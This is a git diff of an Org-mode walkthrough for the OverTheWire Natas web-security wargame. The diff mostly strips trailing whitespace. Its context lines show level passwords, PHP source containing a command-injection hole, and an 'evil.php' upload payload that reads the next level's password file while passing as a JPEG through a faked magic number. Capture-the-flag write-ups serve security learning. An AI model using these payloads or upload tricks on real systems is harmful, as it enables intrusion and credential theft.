@@ -55,17 +55,20 @@ View the source page by using a short cut key (for me =Ctrl+u=):
 : h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7
 
 * Level 2
-Again view the source page. There is a line with a link to an image 
+Again view the source page. There is a line with a link to an image
 
-#+BEGIN_SRC 
+#+BEGIN_SRC
 <img src="files/pixel.png">
 #+END_SRC
 
-This links to "http://natas2.natas.labs.overthewire.org/files/pixel.png", note 
-the =/files/pixels.png=. Which means it might be possible to explorer the =/files=
-directory. Exploring "http://natas2.natas.labs.overthewire.org/files/"
-it shows that there it another file called =users.txt= which contains the
-password for the next level.
+This links to @@html:<a
+href="http://natas2.natas.labs.overthewire.org/files/pixel.png">
+http://natas2.natas.labs.overthewire.org/files/pixel.png</a>@@,
+note the =/files/pixels.png=. Which means it might be possible to
+explorer the =/files= directory. Exploring
+"http://natas2.natas.labs.overthewire.org/files/" it shows that there
+it another file called =users.txt= which contains the password for the
+next level.
 
 #+NAME: lvl2
 #+BEGIN_SRC sh :var PASS_NATAS2=pass2
@@ -86,7 +89,7 @@ password for the next level.
 * Level 3
 View the source and find the line
 
-#+BEGIN_SRC 
+#+BEGIN_SRC
 <!-- No more information leaks!! Not even Google will find it this time... -->
 #+END_SRC
 
@@ -115,11 +118,11 @@ curl -u natas3:"${PASS_NATAS3}" "http://natas3.natas.labs.overthewire.org/s3cr3t
 NOTE: from level 4 and onwards the code snippets are written in
 =Python= unless otherwise specified.
 
-To get access to the password we need to come from the natas5 website as is 
-metioned on the website when first loging in. 
+To get access to the password we need to come from the natas5 website as is
+metioned on the website when first loging in.
 
-#+BEGIN_SRC 
-Access disallowed. You are visiting from "" while authorized users should come 
+#+BEGIN_SRC
+Access disallowed. You are visiting from "" while authorized users should come
 only from "http://natas5.natas.labs.overthewire.org/"
 #+END_SRC
 
@@ -186,7 +189,7 @@ Now the code that changes the referer to natas5:
 * Level 5
 After logging in the web page shows:
 
-#+BEGIN_SRC 
+#+BEGIN_SRC
 Access disallowed. You are not logged in
 #+END_SRC
 
@@ -231,7 +234,7 @@ changed to =loggedin=1= then that should give access to the password.
 After logging in we are prompted to input a secret. The page source
 contains the line:
 
-#+BEGIN_SRC 
+#+BEGIN_SRC
 <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
 #+END_SRC
 
@@ -239,7 +242,7 @@ Then going to the url
 http://natas6.natas.labs.overthewire.org/index-source.html
 contains:
 
-#+BEGIN_SRC 
+#+BEGIN_SRC
 include "includes/secret.inc";
 #+END_SRC
 
@@ -271,7 +274,7 @@ reveals the secret: =FOEIUWGHFEEUHOFUOIU=
 * Level 7
 The source page says:
 
-#+BEGIN_SRC 
+#+BEGIN_SRC
 <!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
 #+END_SRC
 
@@ -300,7 +303,7 @@ print(r.text.split('\n')[-7])
 * Level 8
 The source page again has a link to:
 
-#+BEGIN_SRC 
+#+BEGIN_SRC
 index-source.html
 #+END_SRC
 
@@ -314,7 +317,7 @@ which reveals an encoded secret:
 
 it is encoded with this function:
 
-#+BEGIN_SRC 
+#+BEGIN_SRC
 function encodeSecret($secret) {
     return bin2hex(strrev(base64_encode($secret)));
 }
@@ -385,7 +388,7 @@ some words in the search box shows that it actual does find all words
 containing the searched string. Inspecting the source reveals this
 piece of code:
 
-#+BEGIN_SRC 
+#+BEGIN_SRC
 if($key != "") {
     passthru("grep -i $key dictionary.txt");
 }
@@ -416,7 +419,7 @@ for the next level.
 This level is similar to the previous level but it checks if there are
 "illegal" characters in the input.
 
-#+BEGIN_SRC 
+#+BEGIN_SRC
 if($key != "") {
     if(preg_match('/[;|&]/',$key)) {
         print "Input contains an illegal character!";
@@ -448,7 +451,7 @@ print(re.findall('/etc/natas_webpass/natas11:(.*)', r.text)[0])
 From the source code, these are the most important
 functions/variables:
 
-#+BEGIN_SRC 
+#+BEGIN_SRC
 $defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
 
 function xor_encrypt($in) {
@@ -643,7 +646,7 @@ e.g. =/upload/../etc/natas_webpass/natas13=, but all failed. So maybe
 it is possible to upload some malicious php code instead of a jpg.
 
 Create a php file called =evil.php= that contains:
-#+BEGIN_SRC 
+#+BEGIN_SRC
 <?php echo (file_get_contents('/etc/natas_webpass/natas13')); ?>
 #+END_SRC
 This will print the password for natas13.
@@ -690,7 +693,7 @@ similar to level 12. The /magic number/ is =\xFF\xD8\xFF\xE0=.
 #+NAME: lvl13.1
 #+BEGIN_SRC python :var PASS_NATAS13=lvl12.2
   user, url = user_url(13)
-  
+
   # write the magic number and the to be executed php to evilFile
   evilFile = '/home/br/Pictures/shots/evil3.php'
   fh = open(evilFile, 'wb')
@@ -752,4 +755,3 @@ the username and the password.
   # print(re.findall('password for natas15 is (.*)<br>', r.text)[0])
 
 #+END_SRC
-
